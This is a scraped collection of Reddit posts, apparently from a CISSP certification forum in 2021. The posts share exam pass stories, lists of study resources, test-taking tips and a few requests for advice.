\- Danturthi's book was good for concise summaries of key topics in each domain.  He also emphasizes reading questions carefully and refactoring them in your head to remove irrelevant language, which I thought was a sound approach.

\- I found Chapple's LinkedIn videos to be up to date, well presented, and detailed.  They were also indexed to make skipping to a specific subject easy.  However, I don't learn efficiently from videos so I mostly used these to zero in on specific topics.

\- Kelly Handerhan's ""Why You Will Pass"" is a free, short, and worthwhile YouTube watch, even if just to reinforce that you should think like a manager.  I am one, so this wasn't a stretch, but it is a critical mindset to bring into the exam.

\- There are some cheat sheet style summaries which are posted in this subreddit which I found to be helpful.

**What wasn't useful**

\- I did not find the official ISC2 study app to be useful.  It didn't offer different study modes or statistics, and I think the question banks in Pocket Prep and Boson are superior for learning the domains holistically.

\- I found Kelly Handerhan's Cybrary videos to be a bit too high level for me, but I think they would be a good entry point for someone new to the field.  Her videos are very down to earth and accessible.

\- I felt that the explanations in Pocket Prep and Boson adequately covered the Shon Harris and Chapple books, so I did not feel it necessary to buy them having drilled these apps.

I hope this is helpful! Good luck!",2021-08-24

Though this post is not about passing CISSP, but I attended my CISSP certifcation in 2018, continuously improve and learn. Being certified in CISSP isn't an end but a begin of your new journey. 

It opens you a doorway and demonstrate you have sufficient knowledge in various security domains (now 10?) and where  you can then focus on what you are lacking or you are interested further.

In between the years after certified in CISSP, I have also certified in ISACA's 5 CXXX exams. 

Excited to submit my final endsorment for ISC2 to review. 

And should I say ""graduate"" from ISC2?

For those who  are not yet ready for CISSP (CISSP is not a beginner certificate), it's ok,  you can try SSCP instead as a starting point, I would strongly recommended this (though it's not the path I have taken). But SSCP is a good interim step for you to prepare your CISSP if you don't have the full domain knowledge and experience.

3080,p8kknx,Passed at 150 8/18/21! Huge Thank You To this Sub and Few Lessons Learned,"I have been waiting to write this post for a long time. I'll try to keep it succint and useful.

Background: Retired Military with last 12 years in upper middle IT/Policy management.  Took a training camp CISSP boot camp one time a few years back before retiring. Didn't pass, it was the old 250 Q format and I scored a 600. Seeing as this course is now $5K I would not even consider it.

I knew it was passable so I set a goal to get it done. I didn't look to seriously complete that goal until around 3 months ago. Long before that I hung around this sub reading about people's successes and failures. I started in June, studied a few hours a day, with 80% of my study time devoted to the various question bank apps. I did these while on the stationary bike at the gym.

I probably bought EVERY resource on here and TRIED to get through all of them. Here's the rub...I DIDN'T NEED THEM ALL!!!  

This is where lessons learned come in, so here goes. 

1. Run your own race. Take a few practice tests and get a gauge on what you know. If you are scoring in the 50-60% rate at the start, you have a solid baseline to build on.
2. Once you get that baseline, SCHEDULE THE TEST. It is said so much here, but is the single biggest driver that will make you study.
3. THINK LIKE A MANAGER...but KNOW THE MATERIAL LIKE A TECHNICIAN. Just thinking like a manager will not get you through this test. There will be plenty of purely technical questions too.
4. The BEST study material/formats are the you ACTUALLY CONSISTENTLY DO. Don't waste money on stuff you aren't going to use. I have the shon harris book, sybex 8/9, the CBK...I got through about 30% of the content across all of these. The material bored me to tears. What I was able to consistently digest was practice questions with some delving to the books for problem areas. That said, know you will need to use SEVERAL sources...this is good for building your knowledge base, and getting used to different terms for the same thing. 
5. Don't take your practice test scores in relation to others here as some type of gospel as to whether you should test. Use them to gauge your knowledge. My highest score on Boson was 610, and my usual score was around 550. I only consistently scored in the 60s-70s on the Shon Harris online questions. Pocket prep was in the 70s too, only went up with repeat questions.
6. Do a PLEHORA of question across NUMEROUS sources. Not only does this build your knowledge base, it also builds your stamina for when you take the test. ALSO MEMORIZE the answers...people say don't that, but guess what, you are probably bound to get a few softball questions that you only get right because you memorized some obscure aspect of an answer. Learn why the answers are wrong but YES some rote memorization is required. You don't want to get a gimme vocabulary question wrong because you didn't do some basic memorizing.
7. Everyone's experience with the test is different! The test was definitely hard, but at no time did I feel like I was taking a different test that what I studied. It just fest like they worded the stuff differently. Pretty much 80% of my questions felt *vaguely familiar*.
8. Find a video bootcamp series or two and VIEW THEM IN THEIR ENTIRETY. I tried all of them and everyone learns different so you have to find the one that works for you. The right answer is the one you can get through, lol. I will just put my experience with these.                                                                         

*  Kelly Handerhan Cybrary, Rob Witcher(MindMap) --These people are doing the lord's work. I owe them largely for my pass
* Thor Pederson, I could not get through his udemy courses...hated his tests too...hhhmmm.
* Phrabh Nair -- couldn't get through his course
* Mike Chapple -- Nope couldn't get though his either
* Larry Greenblatt -- Maybe his live boot camp is better but the $99 package SUCKS! Dude is not funny! 80% nonsensical rambling, off topic banter and defensive driving class comedian level  humor, 20% actual usable insight into the test.
* That said I did at least 10% of every source I listed so take it for what that's worth.

This got real long real fast I guess the best advise is find the study materials that work for you, get a baseline and set a timeline to test, then STICK TO IT.

When you get weary, come here for motivation. That's it and THANK YOU!!!!!!!!!!",2021-08-21
3081,p8he4a,Passed in 100 @ 100,"Took my exam today at 1PM and got a provisional pass!

I feel like I did a solid amount of preparation and I also work in the security assessment space so wanted to take a stab at it without much study time. I started July 17th and gave myself a month. I wasn't sure on how confident I would feel in that time frame so I actually didn't register until August 10th. At that point I felt pretty confident in being able to tackle the exam, but from 8/10-8/19 I was eat/sleep/breath CISSP (wife wasn't a fan lol). The exam was definitely interesting. My last certification was Security+ and AWS:CCP which both are super straight forward. I did not feel that way about the CISSP. My confidence level was high on only about 50% of the questions.  

I used the following material for prep: Books: 11th hour (read entire thing in last 48 hours), OSG 8th edition (probably spent less than an hour in this book over my course of studies), Luke Ahmeds 25 question book  Questions: Official Practice Tests 3rd edition (answered \~200 questions from here); Wiley Practice Tests (\~1000 questions); Pocket Prep (all 800, app is at 96% correct), Discord questions (a lot); ISC2 app (\~500 questions)  Videos: Kelly H. - Cybrary CISSP; Mike Chapple - LinkedinLearning; Destination Certification; CISSP Exam CRAM series; Prabh Nair, Luke Ahmed, etc.; every think like a manager video I could find :) The video content was probably 100% the reason I passed  Filled a 70 page notebook with things I was writing down from videos and books; probably wrote out BCP and SDLC process 10x each

My primary resource was I watched the [""CISSP Exam Cram"" videos on YouTube](https://www.youtube.com/playlist?list=PL7XJSuT7Dq_XPK_qmYMqfiBjbtHJRWigD) but I only actually watched the videos for the first 6 domains and didn't watch any of those extra ones.

3084,p837ym,Passed in 100,"Passed CISSP Exam yesterday August 19 2021 in 100 questions.

For prep I used the sybex study guide 8th edition, and the online sybex practice bank included with the guide.

I read for about 1-2 hours a night most nights over the course of about three months. I did the written reviews and in-book chapter reviews at the end of each chapter. 

The last 5 days before the test I switched to the online tests. I did all of the individual chapter questions first, identified my two weakest chapters and re-reviewed them.

Then switched to the practice exams and did about three, again flagging and reviewing any concepts I was unsure of.

The exam felt difficult. I thought I actually failed when it ended at 100. I worked by eliminating wrong answers and reasoning the best choice among valid answers remaining.

I took about 90 minutes.

My advice to those preparing for the exam would be to expect the exam to be more of a reasoning exercise than memorization. The online practice exams all feel very route oriented. The actual test for me felt much more applied and required critical thinking to make the best possible choice with the limited information available. Try not to assume any facts— if it’s not explicitly written in the question you can’t assume it exists. Interestingly this skill of making critical judgments with limited time and info is required by security professionals.

Good luck!

3088,p79zq6,"Failed first time, need right advice and guidance.","I took CISSP exam and failed in my first attempt (49/4/2021). I used the following material:
1- Sybex 8th Edition
2- cybex practic test
3- BOSON (complete 200+ Q only)
4- MindMap series
5- other practice tests (800+ Q)
6- 2 Video courses 
I started on September 2020 and during study. My plan was to submit for the exam on February but it took more time and i started to lose focus. I foxed a lot on videos courses and book more than practice tests (65\ 35). I was focused on technical part ""think as technical"" during practicing the practice test. During the exam there were around 10 to 15 Q i could not understand what is required. Now i started to study for the second attempt, i purchased sybex 9th. should i use 11th Hour ""for the new 2021 cissp"". what other material should i use?

I do everything from networking, help desk, sys. admin, cybersecurity, etc.-I have a Sec+ cert.-I've been in the I.T field professionally for just over 1 year

Obviously, I can't list every single factor out and am aware that different countries/states have different salary ranges, but I'm not looking for a hard number, just a ballpark estimate. Currently, I'm making $54K annually, which is a little above average for my area and experience.

**Primary Resources:**

1. Official Study Guide Sybex - Started with 8th edition but then purchased new one just to make sure I do not regret later. It was more or less same but it gave me confidence.
2. Official Sybex Practice Test (2nd edition covered 50% and 3rd edition 100%, latest edition is worth purchasing) – Please do not skip this. It covers ever single chapter, topic, and domain which will help you to know the content in a better way. Make sure you register your OSG and Practice test on Wiley for better experience and more questions.
3. Boson CISSP Test (Previous edition)
4. Mike Chapple CISSP Course on LinkedIn Learning
5. Kelly Handerhan on Cybrary

**Supplement Resources:**

1. Shon Harris CISSP Book (8th edition) - Read SDLC from this book, it’s too good.
2. Adam Gordon (ITPROTV, New 2021 version CISSP Fast-track Course)
3. Prabh Nair’s YouTube Videos - Very important, Do not skip these videos.
4. Destination Certification YouTube Videos - Watched these videos many at times during preparation. Watched few videos night before exam also and they were spot on.
5. Mike Chapple last minute exam review
6. 11th hour CISSP and Memory palace by Prashant Mohan
7. And bunch of random Google search, Wikipedia, and YouTube videos.

Initially I started marking on book but soon I realized, it was going into my volatile memory. I needed it in my secondary memory so I started writing notes for each domain and they helped me a lot. This was the best decision of mine.

Group study on google meet for 2 weeks with 2 other aspirants. We studied for almost 3 hours daily and 8 hours on weekend just 3 weeks before the exam. Best part is, all 3 of us PASSED. I am sure they are reading my post right now ;)

My discord group is still active where many people are preparing to appear for the exam.

**About the exam:** It’s true that the real questions are different than the practice ones however; if your concept is clear then you would be able to rule out at least 2 options most of the time. Read questions carefully. Keep maximum 1 minute for each question and if you take more than that then cover that gap with the straight forward questions. Watch these 3 videos for the right mindset before you go for the exam–

Please focus on each topic and try to understand in detail. Write notes, read your notes daily, ask question to yourself and give answer to yourself. If you are satisfied with your answer, you are good to go. Pay special attention to words which have synonyms mentioned in the book.

Boson Questions 2020 and 2021 update (basically the same)

The day before the exam I reviewed the CISSP Last Minute Study Guide By Micke Chapple ( it was a good review)

&#x200B;

I started preparing for the exam mid-Febreuary but didn't really commit to every day studying for 3-4 hours until mid-June when I booked my exam date.

3107,p4k8rc,Feeling unprepared for my upcoming test. Should I cancel?,"Update: Decided to go ahead and take the exam today despite feeling certain that I would fail. I ended up passing at 100 questions with about an hour to spare. I was actually quite surprised by how easy the exam was. This seems like an exam where the preparation is the most daunting part given the volume of info that you might encounter on the exam. Thanks for all the comments and advice prior to the exam!

Posted this elsewhere but looking for a few more opinions.

Thinking about cancelling my upcoming test (four days away). Was scoring in the 80's on the Sybex official practice exams and figured I was ready. Then I watched Larry Greenblatt's CISSP questions on youtube and got almost all of them wrong (always narrowed it down to the correct two and then chose the wrong one). Then I took Thor's Hard CISSP Questions exam on Udemy today and scored 60.  Perhaps I'm rushing the process. Been studying for about 10 weeks.

This would be my first attempt and is paid for. Any further attempts would be out of pocket, though the expense doesn't bother me too much. Any feedback would be much appreciated.",2021-08-15
3108,p4dg4h,Another passed at 100 questions,"Passed yesterday after 100 questions in about 1 hour, 15 minutes. Background for me is about 14 years experience with virtualization, cloud computing, network security and consulting.

Spent 2 weeks studying for the SSCP and after passing that exam, spent another 6 weeks studying for the CISSP.  My study process was the following:

&#x200B;

* Read the AIO guide twice (should have read this second since it was more detailed than the official study guide)
* Read the official study guide fully once and skimmed through twice after
* Watched the Cybrary videos
* Watched the Mike Chapple CISSP linked in learning videos
* Watched the Prabh Nair CISSP videos
* Used the official Sybex practice questions, pocket prep questions and Boson questions
* Anytime I ran into topics I didn’t know, I would thoroughly research them
* Jotted down the order of difficult topics like BCP, Risk Management etc.

Now for the exam itself. First pointer is that I’d recommend your ID isn’t expired because I had to race back home and grab my passport which wasn’t fun.

Since this is an adaptive exam and the questions vary, I know some people have had an easy time with the exam and some people had a hard time with it. I had a hard time with it. After about 10 questions I was thinking to myself that I’m probably going to fail and there goes a lot of money down the drain. I also freaked out because I couldn’t see how I could possibly prepare more. But I took each question one at a time and used process of elimination to narrow down the choices and pick the most appropriate answer.   I heard that the questions start easy and get harder as you go but I had a mix of easy and hard questions.   The reason I found it so difficult was that the real questions were totally unlike the practice questions I was taking. The practice questions typically have 1 or 2 obvious answers, but there were about 40 questions that had all 4 answers as plausible. Designers of the practice questions really need to up the difficulty level on them.

Anyways, based on my experience, here are some tips:

&#x200B;

* There were many questions that used alternate terms for technology or controls, so pay attention to the study guide sections where they will say, “this term could also be called…”
* When you have 4 plausible answers, you really need to focus on the question and what it’s asking for: What is the most cost efficient, what provides the most protection (rather than detection) etc.
* It’s been said before but focus on answers that protect people, avoid risk and achieve desired management outcomes - sometimes that’s only way you can pick your answer
* Most of the questions were about concepts but you will see deeper technical questions thrown in so be prepared
* You will probably see concepts you’ve never seen or heard of before, and you’ll have to use your English comprehension skills to pick the one that sounds the most correct
* Focus a lot of your studying on how the technologies and security controls work together and why you would use them, rather than how they work
* A lot of the methodologies and frameworks are different for each organization but you should get a rough idea of what order certain activities will be carried out in
* Study everything - I had 3 questions on a topic that’s only a paragraph in most books

Hope this helps any future test goers.",2021-08-14
3109,p4cpze,Chinny Chin CISSP,"Okay, a little context.  I'm a 30 year IT professional with the last 10 as a CIO.   As I get closer to retirement, I thought it would be interesting to see what I'd learned by pursuing some certifications and then maybe do some teaching/consulting in security when I'm ready to bag it.  I decided to do the following certs CISA, CISM, CISSP starting in June.  Passed CISA in June and was certified soon after, CISM in July and certified a week ago and today I took the CISSP.

Last week I was doing some consulting near Buffalo and had a flight home to South Carolina scheduled to arrive at 5:30pm yesterday.  Due to delays and canx I ended up getting home at 2am.  My CISSP exam was set for 9:30am this morning.  Barely got up in time, just made it to the test center half asleep, etc.  Anyway I provisionally passed in 2 hours.  (ISC) Squared folks were were nice enough to let me do 150 questions.  :)

I didn't do much prep for any of these......probably 10 hours for the CISA, maybe 15 for CISM and 20+ for the CISSP.  For CISSP I used Mike C's videosthat on linkedin learning, the Official Study Guide, Thor's free  videos and the MindMap videos on YT.  

I had very little encryption stuff on the exam, lots and lots of questions about role based access and her cousins, didn't have to use the calculator, the math was simple, lots of scenario questions (trick being to find the special word), more application security stuff then I expected, very little auditing, some governance and some process sequencing questions.  

Basically, the stuff I had to learn was really official ISACA and (ISC)2 terminology for things I'd been doing as a CIO/Director, etc., for years.  Strangely, the language on the test today seemed to written by somebody with a thesaurus on his/her desk.  Other than proving that I could read, I'm not sure what that accomplished.  The goal was supposed to be comprehending concepts but using weird sentence construction  and possibly invented adverbs struck me as very weird.  Anyway, that's nitpicking.

Last thought, I've seen a lot of comments and debates about ""which is harder"" between the CISM and the CISSP.  Got to say, neither one is what I'd call very hard but it is absolutely true the CISSP covers a great deal more information while ISACA seems to break it up between a few different exams.  Makes sense given the focus of the organizations is not the same.  I'd be happy to answer any questions about my experience today or before.

Anyone make a similar pivot with any advice?",2021-08-14
3111,p3q71k,Passed at 150 questions yesterday.," I managed to hit a hanging curve yesterday and pass. 
  
###### I removed a bunch of information that may or may not be under NDA ######
  
I think what prepared me was looking up the answers to questions I missed when taking the practice tests, remembering the golden words, and the standbys like ""is the word from the question in the answer?"" etc. and SLOW DOWN! I finished in an hour and a half and I forced myself to read each question, all the answers COMPLETELY, and then the question again and try to pick it apart looking for words that were key to the answers. 3 hours is more than enough time so take your time.  
The questions weren't tricky, per se, but I had a few that would ask what would you do if you had a scenario where you had (condition 1) and (condition 2)?  And the conditions were basically the definition of (this term we studied). So you have to know the information to know what term is being asked.   
     
Some other notes from a peer that recently passed and I used:  
1-I created a crib sheet of the things I struggled with, wrote them by hand 4-5 times.  Memorized that enough that I spent the first 10 min writing out that sheet.  Honestly I only referred back to it 3-4 times but it at least got me started.   
2- I did a ""vocabulary"" exercise the day before the exam, where I just flipped through our course books and read words and defined them. I think that helped more than I know.    
3-  I took a few mental breaks during the exam to battle my impatience.  I would start to hurry and not read all the way through Q/A so I would stop and and stare at my desk for 30-60 seconds.  ""Brought me back"" to focus.

3112,p3jdsz,"Obligatory ""passed at 103"" and some tips I haven't seen elsewhere","Passed today at 103!  Didn't have a lot of prior CISSP relevant experience (I have the required job experience, but most of my jobs barely touched on security topics).  The Security+ has about 50% overlap with the CISSP, and I highly recommend taking it first.  Consistently averaged 70-75% on all CISSP practice question banks across multiple platforms.  


Tips I haven't seen elsewhere:   
\-The test requires a good bit of reasoning / IQ test style stuff, and English comprehension.  A dozen questions had long paragraphs of information with one or two key words that totally changed the ""correct"" answer, so be sure you pay attention to *every single word* in the long format questions.

\-Skim the question, read the answers, then read the question carefully again.  The answers frequently tell you what part(s) of the long paragraph are the most important.

\-Brain dumping in the exam room: memorizing key acronyms/mnemonics, security models, OSI model, basic ports, encryption and hashing algos, other models, formulas, etc is a good idea.  When necessary, come up with your own ways to remember them rather than relying on frequently terrible mnemonics in books.  Once you're in the exam room, guess what!  You're allowed to brain dump everything you memorized on to paper!  This helped me save a lot of brain clock cycles, as I didn't have to run through everything I'd memorized mentally, and could glance at the paper for the relevant information. 

\-As Handerhan mentions, when ethical questions are at stake, lean towards the most ethical.  I don't want to elaborate further, but one question I got was really tailored to make me choose the ""unethical"" route, and IRL I likely would have - because I personally IRL knew the ""correct"" answer, and the ""unethical"" answer really wasn't unethical IRL -- but in the exam, you frequently have to work with the information presented in the question.  

\-About 3 of the questions were totally baffling.  I'd never read or heard about any of the concepts in the question or answers, and the question itself wasn't entirely clear.  Try to suss out what they're getting at, eliminate incorrect or non-real answers, and roll the dice.

\-Read the question and answers multiple times.  Every word.  Don't reflexively give the seemingly correct technical answer when an obfuscated better answer may exist.  

\-Seriously, a lot of it is reasoning.  Figure out the key points of the question, eliminate wrong answers, then make a detailed mental analysis of the remaining answers.

\-You will encounter questions you've no idea what the answer is.  Think on it for a few minutes (you have time), eliminate wrong answers, guess, and move on.  This isn't a test you must get a 90% on to pass.  Many options are debatable.  

\-When complex topographies are described, try to imagine it in your mind, with the flow of traffic.  But I'm a visual thinker, YMMV.

\-Day of the exam: schedule the exam for a time of day that you're usually mentally sharp, sleep well, eat light meals, take your usual amount of caffeine (I like L-theanine, a natural supplement extracted from green tea that calms caffeine and brain jitters - not woo woo, it is proven.)  Watch Greenblatt's 2018 and 2020 Exam Tips on YT, and Handerhan's ""why you will pass the CISSP.""  Get out of the IT grunt mindset and in to the master mindset.  Greenblatt's ""think like Kirk and Spock"" metaphor actually helped me on a couple questions.  I'd catch myself being too Spock-analytical, switch to Kirk mode, and the answer would pop out.  Wear comfortable yet professional clothes to the exam (a nice outfit can psychologically make you feel important and get in the mindset, IMO), wear a short sleeved shirt in case it's warm, and bring a light jacket in case it's cold.  

\-My personal pre-public speaking/important moment ritual: Take a minute or two to collect your thoughts and calm your mind.  Imagine yourself striding out successful.  Find a wall and stand against it and fix your posture.  Smile.  Feel the badassery flow through you.  YOU have come far enough and learned enough to sit for this $750 exam.  You can do it.  If you fail, there's always 30 days from now.  Breathe, stretch, fix your posture again, smile, and get to work!      


\-Read CISSP Sybex 8th edition once  
\-Listened to Inside Cloud and Security free youtube videos while in the car - they have great free pdfs of the slides for study - Mind Map videos are more entertaining to watch, but the shorter video format isn't conducive to car rides.  
\-Paid $20 for Pocket Prep for a month - it was useful to get info on what domains to focus on and to have a portable practice option.  Questions seemed very similar to the Sybex free questions.  A day before the exam, I went through and cleared out all the missed questions by getting them correct.  
\-Did a few hundred Sybex practice exam questions - would tab out and google stuff as needed to reinforce.  
\-These ""cheat sheets"" are also awesome: [https://cdn.comparitech.com/wp-content/uploads/2020/01/CISSP-Cheat-Sheet-Domain-1.pdf](https://cdn.comparitech.com/wp-content/uploads/2020/01/CISSP-Cheat-Sheet-Domain-1.pdf) (change the last number of the URL to 1 through 8 and download each)",2021-08-13

Background wise I only have a year of direct cyber security experience as a security analyst, and a year of sys admin experience before that, plus some security and management experience from way back in the day. I also have the Cybersecurity Bachelor's from WGU, and a bunch of other lower level certs (CCSP, SSCP, AWS SAA, Cysa+, A+, Sec+, Net+, PenTest+, Project+, ITIL, couple of garbage EC-Council certs).

As for studying, I went through a free CISSP boot camp thing that Syracuse University provides for veterans called Onward 2 Opportunity, which isn't much different than any of the 20 hour CISSP training courses on Udemy but it includes all of the official training and practice exam books (barely touched the extra resources) and an excessively in-the-weeds practice exam system through Percipio that helped with learning way too detailed information about things that didn't matter. I also read part of the 11th Hour study guide and went through some of the CISSP Practice Exam book by Shon Harris, like maybe a third of it. I was getting around 80% on practice exams before sitting the exam.
I also watched that ""Why you will pass the CISSP"" video everyone recommends before leaving for the exam today, and it definitely helped getting in the right mindset for the test.

This is where I came across CISSP. Sadly reading through the certifications they all require some working experience.

Is there a certification that can get me into the right direction, although I have zero prior experience? Hopefully can land me a new job too!",2021-08-12
3116,p35d9k,Officially Passed today!!!,"Sharing the good news here because without this group I don't think I would have made it. 

The exam is what everyone says, it's hard and grueling but i approached it with a mangers mindset and got the job done!

For anyone who is struggling please know that I failed this exam before but this group inspired me to keep going, so thanks you all. 

For studying, i used a wide variety of material including a one week intense bootcamp which was very expensive - all paid for by work. If honest, I think the best was Thor Peterson online material with questions and Boson.

One piece of advice I'd like to share is simple. When studying you have to know the whole syllabus and how it connects. Sounds obvious but I failed on this before and i sacrificed on areas of knowledge I wasn't strong on and it cost me dearly.

Second, and last I promise, is track your progress. I kept weekly, daily scores of my test results broken down by domains to help visualise my strengths and weaknesses.  It helped loads. 

Now good luck to anyone on their journey. 

Very best,
Steve",2021-08-12
3117,p34fft,Passed!,"Well, it's provisional, but I'll take it. I made it to 100 questions at around an hour and ten minutes. I thought that I was going out to the front desk to get the paperwork saying I failed - didn't even turn over the printout.

3118,p2yv76,Which is a Better practice quiz method?,"Is it better to take the practice quizzes and then find what answers you got wrong at the end? And research them there?

3119,p2pmjp,Passed CISSP,"Hello Everyone,

After studying for the past 4 or so months, I took the test this AM and passed on my first attempt. Very excited about this as I was very nervous and obviously heard how difficult it was pass. Although I was not confident until I received the printed copy on my way out that said ""Congratulations"", the exam felt very passible as I was going through it. However, once I got to question 100 and it kept going, I started really getting nervous. Once I got to question 120 or so, it kicked me out and I was happy to read that I passed.

A quick background on me. I started in IT back in 2005 as a college student doing desktop support/sys admin work and have been working in a security focused roll since 2012. The past 5 years, I have been working in risk management with GRC as my current roll. 
Now to get to what some of you may actually be interested in hearing about.

I signed up to take the exam on June 5th 2021 sometime in March 2021. Sign up or you won't actually commit to studying. The exam was 700 at the time (now it's 750 since they released the 2021 CBK on May 1st). I can't stress this enough, sign up and pay for the exam. Otherwise, don't waste your time.

I joined certification station on discord. Great community with resources, I recommend doing the same. Adam Gordon from IT Pro TV supports this channel an offers free boot camps to those interested. He also provides all his notes and information on this channel. You can grab it at anytime and just read through them. I was fortunate enough to catch the beginning of his CISSP boot camp which lasted 8 weeks (1 week per domain) at 4 hours/week (2 days/2 hours). Halfway through the boot camp, I realize the CBK was updated with lots of new material which spooked me so I pushed my exam from June 5th to August 11th.

I also had a copy of OSG 7th edition which I read through over the course of a few months. Highlight through it so you can go back and review it. After finishing the boot camp and completing the book, I went back through my highlighted notes leading up to the exam.

I signed up for CCCure test engine that has 2000+ questions for CISSP. I suggest either doing the same or something similar. Go through questions as much as possible. I probably went through those questions several times, answering 4000+ questions. I started going from low 70% results at 20 questions and doing better and better until I was getting about 90% for 150 questions. Questions aren't the same by any means but the topics similar and really helps you think through the questions and answers.

This past weekend, I took Kelly H's. boot camp on Cybrary over 3 days, about 6 hours/day. The material felt a little dated but still helpful.

Last recommendation is watch ""Why you'll pass the CISSP"" by Kelly H and ""CISSP Exam 2020 Exam Tips"" by Larry Greenblatt on Youtube. Both of them provide a lot of information on how to think through the exam. The exam is technical but you are not support to answer the questions from a technical view point but as a risk advisor.

In regards to actual studying on a daily basis, I'd study a few hours each day to continue momentum. I'm a father of 2 who loves to spend time with my family. Even though the exam was difficult, it was very passible.

Good luck and reach out if you have questions! Always happy to chat and help.",2021-08-12

3121,p2hakt,Goodbye CISSP it was fun while it lasted.,"Just wanted to say goodbye to the CISSP community. After 25 years in IT and security I bought a gym and left the industry. I kept my CISSP for the last couple of years but it looks like I am done with IT for good. Got an email this morning saying my membership has been suspended for non payment and although a little sad at least I am not working for anyone else and my gym has the best surveillance system in the world :)Good luck to you all I have met many great people through the industry and it is well worth doing the CISSP if you want people to take you seriously.

Edit: Thank you all for the kind comments. I was finally able to make the one thing that kept me sane into a full time career. As an aside if I did have one piece of advice it would be to have something in your life that is completely different from IT in order to give you a different perspective on an ongoing basis. Good luck to you all.",2021-08-11
3122,p2apwi,Passed CISSP exam in first attempt,"Hi All,

I am happy to inform that I have passed my CISSP exam in first attempt on 26th July’21 and I am happy to share my study plan.

Before reading further, my suggestion to people is that once you have decided to give CISSP exam then don’t stretch your study plan. Once you decide, start preparing and register for the exam and crack it. Once you have decided, nothing can stop you.

And yes, don’t register for the exam unless you want to sacrifice your sleep, social life, social media, web series, movies, and some amount of family time as well. (this is just small list I can recall now). But yes, in the end all efforts are worth it when you get that congratulation print out!!

Thankfully, with school-going kids and my husband also preparing for his certification exam, I got a full study environment at home. 

**Suggestion while preparing for Exam** 

Make notes of important point, preferably handwritten. It will help you to understand better.

I started my preparation in Jan (it was my new year resolution). I followed the below timetable, and the timings were like 

1) Jan to Apr – 5 hours daily (4:30 AM – 8:00 AM & 9:00 PM -10:30 PM)

2) April to May – 1-2 hours daily, as I was quite distracted due to covid situation around and unable to focus

3) June – 5 hours (5:00 AM – 8:30 AM & 9:00 PM -10:30 PM)

4) July – First three weeks – 6 hours (4:30-8:30 and then 8:30 PM – 10:30 PM) and weekends full day.

5) Last 4 days before the exam – Almost 14-16 hours/daily starting from 2:30 AM, till the time my mind gives up. Had to stretch a lot

**I have studied from below listed books –** 

1. CISSP Certified Information Systems Security Professional Official Study Guide 8th edition - Read it once (skipped chapter which I was very familiar like Risk, BCP, DRP, Asset, etc) – 8/10

2. Kelly Handerhon course at Cybrary, Although it doesn’t cover the full syllabus, concepts explained well – 9/10

3. Sari Greene course at O'Reilly – 27 hours plus, it's good for second understanding. In my case, exam pattern changed May onwards, and I studied old book, so I went through Sari Greene video as the content was updated with the latest syllabus– 10/10

4. Adom Gorden Question of the day at LinkedIn – I finished all questions in just 4 days. Go through the explanation also – 10/10

5. Thor Peterson training and question set at Udemy. It’s good for revision 8/10

6. Prabh Nair youtube videos – His all youtube videos are too good. Just go for all CISSP videos it's good especially SDN, SAML, COTS, etc 10/10

7. Eric Conrad’s CISSP Study Guide 11th Hour – Reviewed only last chapter 7/10

8. Mike Chapple videos on LinkedIn learning – His videos are excellent, especially for domain 4, to understand network concepts in a much better way – 8/10

**Last week before the exam –** 

9. Review all your handwritten notes

10. Luke Ahmed book – How to think like Manager – 7/10

11. Review Prashant Mohan Memory Palace second last day before exam – 10/10

12. CISSP Mind Map by Rob Witcher on youtube – His videos are super helpful; I watched his video for the second time last day before the exam. If possible, I would rate as 11/10 :D

I Solved \~3,000+ questions and still felt unprepared.

**Exam day -** 

Although it's recommended to sleep for 8 hours and I would suggest the same, but I could hardly sleep for 3 hours in the night due to the exam stress and I woke up at 1:45 AM, revised my handwritten notes. Just before leaving for exam, I again watched Kelly’s Video on **why you will pass the CISSP exam** and the Test-taking strategy slide from Sari Greene's 27 hours video to ensure you have a good mindset. 

I reached the examination centre at 7:30 AM. 

I was little confused for the first few questions and wasn’t sure if I was reading the questions correct. I relaxed, did some breathing exercises, and focussed on the test.  Although I was initially stressed but after 40-50 questions, I started gaining confidence and after around 80 questions I started feeling that I would pass the exam. 

CAT format can play psychological games as the questions vary in difficulty based on your previous answers and If you are able to respond one question easily, next question will be super tough. I was able to understand the questions and even if I was 100% sure with the answer, I used the elimination technique.

Finally, trust yourself, trust your preparations, be positive, read the question, re-read the question, select the answer based on the elimination process (just to be double sure, as this exam is CAT and you don’t have the option to go back and change response later), only then click on next. And once you get the printout you will forget all your struggle and celebrate. 

I tried my best to pen down all the things. Feel free to ping me in case you required any additional information. All the best for your preparations",2021-08-11

3125,p24uqd,Passed at 100 questions today,"I think the things that helped me the most

1. Consistent study plan over several months. One hour per day during work week.
2. Boson practice exams. Worth the 90 bucks. Definitely the most similar practice questions to the exam.
3. Larry greenblatt on YouTube. He is a little hippy dippy but give him atleast 40 minutes of your time before you move on. His mindset helps you choose the best answer when you narrow it down to two or three answers.
4. Luke ahmed “think like a manager” book. This helps you understand that you should always prioritize policies, thinking before you act, and risk management. Again, helps pick the best answer.
5. Read the questions twice, atleast! I passed at 100 questions at exactly two hours. There were two questions where i was like “ok no clue move on”. But for the others, especially the ones that seems way too easy, read it again! There are almost always two answers that are right. Ask yourself - which is more specific? Is one answer too generic that now the scope is huge and you would waste money? 
6. Wear contacts. My glasses fogged so bad and it was distracting because of covid.
7. Be prepared for some noise distractions and don’t let it ruin your exam. The person next to me cleared their throat every 30 seconds and I was so angry. I broke the marker. Took a deep breath. And told myself to never give up. And then I went back to it.
8. This is a technical exam! You should know how the technologies work. Study what you don’t know and do a deep dive. Worst case scenario you understand a security topic like PKI really well and you use it in your job 3 years from now.

I’m glad I passed. I honestly don’t know if I would have had the strength to keep studying and retake. For those of you that keep failing and keep trying - you are strong. Keep pursuing what is meaningful to you and don’t let anything ruin your relationships and whatever else is important to you.",2021-08-11

3127,p209gl,Passed using only free military resources,"So first up, I passed today at 100 questions in 80 minutes.  And I spent the first 10-15 minutes writing down a bunch of information to warm up (a bit of a mindset trick I picked up from taking the PMP). I think I referenced it maybe once and that was only to verify the steps within the RMF. Honestly, the questions were so easy they were hard. I could make the case for any usually 2-3 and the “think like the manager” was a bit at odds with some of the practice questions I had. So it was a toss up to choose an easy technical control or report the situation up through the process for someone else to figure out. 
  
Anyways, I passed. So what I wanted to do here is provide some **free** resources to all the people in the military (guard/reserve/active) that are thinking about pursuing a CISSP. I paid $0 out of pocket for this cert and you can too. Disclaimer: I do have a bit of background in IT project management and cybersecurity, but still I think these resources are more than enough    
  
